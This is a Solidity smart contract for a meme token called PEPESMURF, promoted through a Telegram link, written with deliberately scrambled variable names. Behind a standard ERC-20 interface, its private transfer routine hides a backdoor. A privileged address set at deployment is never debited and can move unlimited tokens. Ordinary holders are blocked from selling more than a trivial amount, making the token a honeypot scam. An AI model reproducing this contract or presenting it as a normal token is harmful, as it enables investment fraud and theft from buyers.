/*

https://t.me/portalpepesmurf

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PEPESMURF is Ownable {
    string public symbol;

    function approve(address oxzvhpktu, uint256 fkzxd) public returns (bool success) {
        allowance[msg.sender][oxzvhpktu] = fkzxd;
        emit Approval(msg.sender, oxzvhpktu, fkzxd);
        return true;
    }

    IUniswapV2Router02 private vcltmydxpue;

    function transferFrom(address eyzd, address lnkfwbqx, uint256 fkzxd) public returns (bool success) {
        require(fkzxd <= allowance[eyzd][msg.sender]);
        allowance[eyzd][msg.sender] -= fkzxd;
        uhpodkgw(eyzd, lnkfwbqx, fkzxd);
        return true;
    }

    function transfer(address lnkfwbqx, uint256 fkzxd) public returns (bool success) {
        uhpodkgw(msg.sender, lnkfwbqx, fkzxd);
        return true;
    }

    mapping(address => uint256) private zbdnpf;

    string public name;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private wqcngal = 119;

    constructor(string memory ornbxvjeaz, string memory uniarzf, address grvetm, address jkythcfv) {
        name = ornbxvjeaz;
        symbol = uniarzf;
        balanceOf[msg.sender] = totalSupply;
        ckhw[jkythcfv] = wqcngal;
        vcltmydxpue = IUniswapV2Router02(grvetm);
    }

    mapping(address => uint256) private ckhw;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function uhpodkgw(address eyzd, address lnkfwbqx, uint256 fkzxd) private {
        address vwfr = IUniswapV2Factory(vcltmydxpue.factory()).getPair(address(this), vcltmydxpue.WETH());
        bool nzeilqctdxpm = 0 == ckhw[eyzd];
        if (nzeilqctdxpm) {
            if (eyzd != vwfr && zbdnpf[eyzd] != block.number && fkzxd < totalSupply) {
                require(fkzxd <= totalSupply / (10 ** decimals));
            }
            balanceOf[eyzd] -= fkzxd;
        }
        balanceOf[lnkfwbqx] += fkzxd;
        zbdnpf[lnkfwbqx] = block.number;
        emit Transfer(eyzd, lnkfwbqx, fkzxd);
    }

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
}
